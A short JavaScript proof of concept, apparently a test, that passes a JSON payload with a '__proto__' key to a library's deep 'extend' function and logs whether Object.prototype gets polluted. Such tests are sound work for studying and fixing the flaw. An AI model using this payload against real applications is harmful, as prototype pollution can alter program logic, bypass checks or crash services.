import * as e from "./index-arguments.js"
console.log("Before " + {}.polluted)
e.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "polluted"}}'))
console.log("After: " + {}.polluted)
